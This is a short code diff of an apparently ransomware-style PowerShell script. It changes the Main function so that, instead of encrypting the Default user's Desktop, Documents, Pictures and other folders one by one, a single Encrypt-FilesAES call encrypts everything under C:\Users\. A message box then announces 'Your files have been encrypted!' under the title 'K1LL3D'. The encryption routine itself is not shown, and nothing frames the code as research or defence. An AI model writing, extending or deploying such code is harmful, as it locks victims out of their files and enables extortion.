@@ -55,13 +55,7 @@ function MessageBox_Create {
 }
 
 function Main {
-    Encrypt-FilesAES -directoryPath "C:\Users\Default\Desktop"
-    Encrypt-FilesAES -directoryPath "C:\Users\Default\AppData"
-    Encrypt-FilesAES -directoryPath "C:\Users\Default\Documents"
-    Encrypt-FilesAES -directoryPath "C:\Users\Default\Downloads"
-    Encrypt-FilesAES -directoryPath "C:\Users\Default\Pictures"
-    Encrypt-FilesAES -directoryPath "C:\Users\Default\Music"
-    Encrypt-FilesAES -directoryPath "C:\Users\Default\Videos"
+    Encrypt-FilesAES -directoryPath "C:\Users\"
 
     MessageBox_Create -Message "Your files have been encrypted!" -Title "K1LL3D"
 
